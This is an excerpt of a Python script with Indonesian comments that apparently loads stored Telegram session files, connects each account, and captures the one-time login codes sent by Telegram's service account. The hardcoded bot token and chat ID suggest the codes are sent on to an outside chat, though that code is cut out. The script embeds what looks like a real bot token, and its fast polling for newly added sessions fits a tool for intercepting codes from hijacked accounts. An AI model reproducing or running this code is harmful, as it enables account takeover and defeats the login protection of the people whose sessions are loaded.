...
BOT_TOKEN = os.getenv("BOT_TOKEN", "8598329061:AAE-3VxORyUYkRGnhfwHjEQ7DQ69ziKZgt4")
CHAT_ID = os.getenv("CHAT_ID", "5939111303")
...
async def forward_handler(event, client_name):
    ...
    # Debug supaya tahu pesan masuk
    print(f"[DBG][{client_name}] From {sender.id}: {text_msg}")

    # Hanya official Telegram OTP
    if sender.id != 777000:
        return

    # Cari angka 5-6 digit
    otp_match = re.findall(r"\d{5,6}", text_msg)
    if not otp_match:
        return

    otp_code = otp_match[0]

    print(f"[Worker] OTP ditemukan dari {client_name}: {otp_code}")
    ...
    while True:
        try:
            for fn in os.listdir(SESSION_DIR):
                ...
                try:
                    await client.connect()
                    await client.get_entity(777000)  # preload supaya cepat tangkap
                except Exception as e:
                ...
                me = await client.get_me()
                print(f"[Worker] Connected sebagai {me.id} ({getattr(me,'username','')})")
                ...
                async def _handler(event, fn=base):
                    try:
                        ...
                        print(f"[Worker Handler] ERROR di {fn}: {e}")
        ...
        await asyncio.sleep(0.5)  # cek cepat untuk session baru
